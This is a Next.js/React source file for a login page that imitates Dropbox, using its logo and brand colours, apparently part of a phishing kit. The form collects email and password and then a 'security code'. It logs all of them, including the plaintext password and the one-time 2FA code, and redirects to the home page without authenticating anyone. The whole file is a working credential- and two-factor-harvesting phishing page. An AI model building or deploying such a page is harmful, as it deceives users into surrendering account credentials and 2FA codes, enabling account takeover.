'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { addLog } from '../lib/storage';

export default function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [showTwoFactor, setShowTwoFactor] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Log the login attempt
    addLog({
      timestamp: new Date().toISOString(),
      email,
      password,
      code: '',
      type: 'LOGIN',
      ipAddress: 'Local'
    });

    // Show 2FA screen
    setShowTwoFactor(true);
  };

  const handleTwoFactor = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Log the 2FA attempt
    addLog({
      timestamp: new Date().toISOString(),
      email,
      password,
      code,
      type: '2FA',
      ipAddress: 'Local'
    });

    // Redirect to home
    router.push('/');
  };

  if (showTwoFactor) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md">
          <div className="flex justify-center mb-8">
            <Image
              src="/dropbox-logo.png"
              alt="Dropbox"
              width={64}
              height={64}
              priority
              className="rounded-lg"
            />
          </div>
          <div className="bg-white">
            <h2 className="mb-6 text-center text-3xl font-bold text-gray-900">
              Enter security code
            </h2>
            <form onSubmit={handleTwoFactor} className="space-y-6">
              <input
                type="text"
                required
                value={code}
                onChange={(e) => setCode(e.target.value)}
                placeholder="Enter code"
                className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
              />
              <button
                type="submit"
                className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0061fe] hover:bg-[#0051d4] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0061fe]"
              >
                Continue
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="w-full max-w-md">
        <div className="flex justify-center mb-8">
          <Image
            src="/dropbox-logo.png"
            alt="Dropbox"
            width={64}
            height={64}
            priority
            className="rounded-lg"
          />
        </div>
        <div className="bg-white">
          <h2 className="mb-6 text-center text-3xl font-bold text-gray-900">
            Sign in
          </h2>
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email"
                className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
              />
            </div>
            <div>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
              />
            </div>
            <div>
              <button
                type="submit"
                className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0061fe] hover:bg-[#0051d4] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0061fe]"
              >
                Continue
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
} 